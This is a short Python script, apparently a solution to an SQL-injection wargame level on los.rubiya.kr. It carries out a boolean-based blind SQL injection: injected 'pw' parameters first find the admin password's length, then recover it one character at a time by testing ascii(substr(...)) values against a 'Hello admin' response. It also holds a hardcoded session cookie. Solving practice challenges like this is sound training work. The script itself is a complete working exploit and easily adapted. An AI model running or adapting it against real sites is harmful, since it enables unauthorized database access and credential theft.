import requests
import string

header = {"Cookie": "PHPSESSID=f0qtti1vj4ignho60h43jjqe12;"}
url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
string_data = string.digits + string.ascii_letters

print(string_data)

pw = ""
pw_len = 1

# find pw length
while True:
    data = "?pw=' || id='admin' %26%26 length(pw)={}%23".format(str(pw_len))
    response = requests.get(url + data, headers=header)
    if response.text.find("Hello admin") != -1:
        break
    print("[*] Finding... : " + str(pw_len))
    pw_len += 1
print("[+] Get pw Length : " + str(pw_len))

# find pw
for idx in range(1, pw_len + 1):
    for i in string_data:
        # data = "?pw=' or id='admin' and pw like '{}{}%".format(pw,i)
        # data = "?pw=' or id='admin' and substr(pw,{},1)={}%23".format(idx,i)
        data = "?pw=' || id='admin' %26%26 ascii(substr(pw,{},1))={}%23".format(idx,ord(i))
        # print(data)
        response = requests.get(url + data, headers=header)
        if response.text.find("Hello admin") != -1:
            pw = pw + i
            print("[*] Finding... : " + pw)
            break
print("[+] Found pw : " + pw)